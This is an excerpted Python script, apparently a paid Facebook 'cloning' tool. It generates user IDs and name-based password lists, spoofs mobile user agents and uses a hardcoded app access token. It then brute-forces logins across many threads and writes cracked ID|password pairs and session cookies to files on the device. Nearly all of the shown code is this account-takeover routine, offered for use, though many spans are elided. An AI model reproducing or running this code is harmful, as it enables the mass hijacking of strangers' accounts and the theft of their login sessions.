...
try:
	...
	os.system('python MLM.py')
	
print('[•] Follow My Account')
os.system('xdg-open https://www.facebook.com/ThankZinTun.coMLM')
...
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12','12.0.1','12.0.2'])
...
logo=("""\033[1;91m___  ___ ___  ___  _   _ _       _   
...
| $$\  $ | $$| $$      | $$\  $ | $$
| $$ \/  | $$| $$$$$$$$| $$ \/  | $$
|__/     |__/|________/|__/     |__/\033[1;32m    XD
\033[1;34m----------------------------------------------
 [~] Author   : Thant Zin Tun
 [~] Facebook : Thant Zin Tun
 [~] Tool     : Paid
 [~] Version  : 0.0.1
\033[1;94m----------------------------------------------""")
def linex():
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				linex()
				print(' \033[1;33m[1] \033[1;37MLMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37MLMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37MLMethod  (for new ids) \033[1;32m  (slow) \n \033[1;33m[6] \033[1;37MLMethod  (for new ids) \n \033[1;33m[7] \033[1;37MLMethod  (for new ids) \n \033[1;33m[8] \033[1;37MLMethod  (for new ids) ')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				...
				os.system('xdg-open https://wa.me/+959454772722?text=')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[1;33MLMethod   (best) \033[1;32m \n [2] \033[1;33MLMethod   (v-fast)  \033[1;32m \n [3] \033[1;33MLMethod   (v-best)  \033[1;32m \n [4] \033[1;33MLMethod   (with cokies) \033[1;32m \n [5] \033[1;33MLMethod   (slow)  \033[1;32m \n [6] \033[1;33MLMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		clear()
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as MLM:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					MLM.submit(MLM1,ids,passlist)
				if mthd in ['2','02']:
					MLM.submit(MLM2,ids,passlist)
				if mthd in ['3','03']:
					MLM.submit(MLM3,ids,passlist)
				if mthd in ['4','04']:
					MLM.submit(MLM4,ids,passlist)
				if mthd in ['5','05']:
					MLM.submit(MLM5,ids,passlist)
				if mthd in ['6','06']:
					MLM.submit(MLM6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
		...
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;33MLMethod   (best) \033[1;32m \n [2] \033[1;33MLMethod   (v-fast)  \033[1;32m \n [3] \033[1;33MLMethod   (v-best)  \033[1;32m \n [4] \033[1;33MLMethod   (slow) \033[1;32m \n [5] \033[1;33MLMethod   (slow)  \033[1;32m \n [6] \033[1;33MLMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;32m [MLM-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				'coMLMunity_id':'','cpl':'true','try_num':'1',
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [MLM-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MLM-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[1;91m [MLM-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/MLM-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/MLM-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MLM-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MLMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MLMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/MLM-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MLM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MLM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [MLM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MLM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MLM-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/MLM-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MLM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MLM-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [MLM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MLM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MLM-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MLM-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			MLM=session.cookies.get_dict().keys()
			if "c_user" in MLM:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [MLM-OK] %s | %s'%(ids,pas))
				open('/sdcard/MLM-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in MLM:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [MLM-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MLM-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MLM-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MLM-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
	...
	loop+=1
#method1rnd
def MLM1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MLM-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MLM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MLM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [MLM-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MLM-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def MLM2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MLM-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MLM-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [MLM-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/MLM-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def MLM3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/MLM-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MLM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def MLM4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MLM-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [MLM-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [MLM-OK] '+uid+' | '+pas)
						open('/sdcard/MLM-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [MLM-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/MLM-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
